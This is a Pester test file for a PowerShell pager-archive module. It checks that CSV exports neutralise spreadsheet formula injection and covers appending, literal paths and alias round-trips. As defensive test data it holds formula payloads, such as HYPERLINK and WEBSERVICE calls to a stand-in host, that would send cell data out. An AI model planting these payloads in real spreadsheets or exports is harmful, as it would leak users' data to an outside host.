#Requires -Modules @{ ModuleName = 'Pester'; RequiredVersion = '5.9.1' }
# Export-PagerArchiveCsv: no value a spreadsheet would run as a formula
# (security review C2), otherwise what Export-Csv writes.

BeforeAll {
    Import-Module -Name (Join-Path -Path $PSScriptRoot -ChildPath '../PagerArchive/PagerArchive.psd1') -Force

    # A message as the module makes it, with made-up text.
    function New-TestMessage([string] $Text) {
        $row = [pscustomobject]@{
            id = 1; capcode = '0100001'; text = $Text; display_text = $Text; priority = 'Emergency'; heartbeat = $false
            sent_at = '2026-10-20T01:02:03Z'; alias_id = 1; alias = 'Station 1'; agency = 'Example Fire Service'; icon = $null; colour = $null
            ignored = $false; category = $null; format = $null; job_number = $null; event_type = $null; description = $null; address = $null
            locality = $null; grid_ref = $null; call_sign = $null; units = $null; extra = [pscustomobject]@{}; labels = [pscustomobject]@{}
            location = $null; receptions = @([pscustomobject]@{ client = 'Receiver 1'; received_at = '2026-10-20T01:02:03Z' })
        }
        & (Get-Module -Name PagerArchive) { param($r) ConvertTo-PaMessage -Row $r } $row
    }
}

Describe 'Export-PagerArchiveCsv' {
    It 'writes a value starting with <Start> with a leading apostrophe' -ForEach @(
        @{ Start = '='; Value = '=HYPERLINK("https://evil.example/?"&A2,"Open job")' }
        @{ Start = '+'; Value = '+1+1' }
        @{ Start = '-'; Value = '-2+3' }
        @{ Start = '@'; Value = '@SUM(A1:A2)' }
        @{ Start = 'a tab'; Value = "`t=1" }
        @{ Start = 'a carriage return'; Value = "`r=1" }
    ) {
        [pscustomobject]@{ Text = $Value } | Export-PagerArchiveCsv -Path TestDrive:/one.csv
        (Import-Csv -Path TestDrive:/one.csv).Text | Should -BeExactly "'$Value"
    }
    It 'leaves other values, empty ones and $null as Export-Csv writes them' {
        $object = [pscustomobject]@{ A = 'SHED FIRE = BIG'; B = ''; C = $null; D = 42; E = $true; F = [datetimeoffset]'2026-10-20T01:02:03Z'; G = @(1, 2); H = 'x' }
        $object | Export-PagerArchiveCsv -Path TestDrive:/plain.csv
        $object | Export-Csv -Path TestDrive:/expected.csv
        Get-Content -Path TestDrive:/plain.csv -Raw | Should -BeExactly (Get-Content -Path TestDrive:/expected.csv -Raw)
    }
    It 'guards a value that isn''t text by how Export-Csv writes it' {
        [pscustomobject]@{ Fields = [pscustomobject]@{ Description = '=1+1' }; Number = -5 } | Export-PagerArchiveCsv -Path TestDrive:/other.csv
        $row = Import-Csv -Path TestDrive:/other.csv
        $row.Fields | Should -BeExactly "'@{Description==1+1}"
        $row.Number | Should -BeExactly "'-5"
    }
    It 'writes a message''s columns as Export-Csv does, with Text and RawText guarded' {
        $message = New-TestMessage -Text '=WEBSERVICE("https://evil.example/")'
        $message | Export-PagerArchiveCsv -Path TestDrive:/message.csv
        $message | Export-Csv -Path TestDrive:/message-plain.csv
        $guarded = Import-Csv -Path TestDrive:/message.csv
        $plain = Import-Csv -Path TestDrive:/message-plain.csv
        $guarded[0].PSObject.Properties.Name | Should -Be $plain[0].PSObject.Properties.Name
        $guarded.Text | Should -BeExactly "'=WEBSERVICE(`"https://evil.example/`")"
        $guarded.RawText | Should -BeExactly "'=WEBSERVICE(`"https://evil.example/`")"
        $guarded.Alias | Should -BeExactly 'Station 1'
        $guarded.Receptions | Should -BeExactly $plain.Receptions
        $message.Text | Should -BeExactly '=WEBSERVICE("https://evil.example/")' -Because 'the object itself is unchanged'
    }
    It 'adds rows with -Append, writing the header once' {
        [pscustomobject]@{ Text = 'first' } | Export-PagerArchiveCsv -Path TestDrive:/append.csv
        [pscustomobject]@{ Text = '=second' } | Export-PagerArchiveCsv -Path TestDrive:/append.csv -Append
        Get-Content -Path TestDrive:/append.csv | Should -Be @('"Text"', '"first"', '"''=second"')
    }
    It 'replaces the file without -Append' {
        [pscustomobject]@{ Text = 'old' } | Export-PagerArchiveCsv -Path TestDrive:/replace.csv
        [pscustomobject]@{ Text = 'new' } | Export-PagerArchiveCsv -Path TestDrive:/replace.csv
        (Import-Csv -Path TestDrive:/replace.csv).Text | Should -Be 'new'
    }
    It 'keeps the rows written so far when the pipeline stops, as a watch does on Ctrl+C' {
        $path = Join-Path -Path $TestDrive -ChildPath 'stopped.csv'
        {
            & {
                [pscustomobject]@{ Text = 'one' }
                [pscustomobject]@{ Text = '=two' }
                throw 'stopped'
            } | Export-PagerArchiveCsv -LiteralPath $path
        } | Should -Throw -ExpectedMessage 'stopped'
        (Import-Csv -LiteralPath $path).Text | Should -Be @('one', '''=two')
    }
    It 'takes -LiteralPath, with no wildcards' {
        $path = Join-Path -Path $TestDrive -ChildPath 'file[1].csv'
        [pscustomobject]@{ Text = 'x' } | Export-PagerArchiveCsv -LiteralPath $path
        Test-Path -LiteralPath $path | Should -BeTrue
    }
    It 'writes an alias file that Import-PagerArchiveAlias reads back' {
        # A guarded value the server's import would unguard (internal/catalog/import.go);
        # alias and template names can't start with a formula character anyway.
        Mock -ModuleName PagerArchive Invoke-PaApi -ParameterFilter { $Path -eq '/api/v1/admin/aliases/import' } -MockWith {
            $script:sent = $Body | ConvertTo-Json -Depth 5 | ConvertFrom-Json
            [pscustomobject]@{
                rows = @([pscustomobject]@{ index = 1; pattern = '0300002'; name = 'Tanker'; result = 'unchanged' })
                conflicts = @(); templates_created = @(); repeated_names = @(); plan = 'p1'; applied = $false
            }
        }
        [pscustomobject]@{ PSTypeName = 'PagerArchive.Alias'; Pattern = '0300002'; Name = 'Tanker'; Template = 'WX'; Colour = ''; Ignored = $true; Id = 2 } |
            Export-PagerArchiveCsv -Path TestDrive:/aliases.csv
        $null = Import-Csv -Path TestDrive:/aliases.csv | Import-PagerArchiveAlias -WhatIf
        $script:sent.rows[0].pattern | Should -Be '0300002'
        $script:sent.rows[0].name | Should -Be 'Tanker'
        $script:sent.rows[0].template | Should -Be 'WX'
    }
}
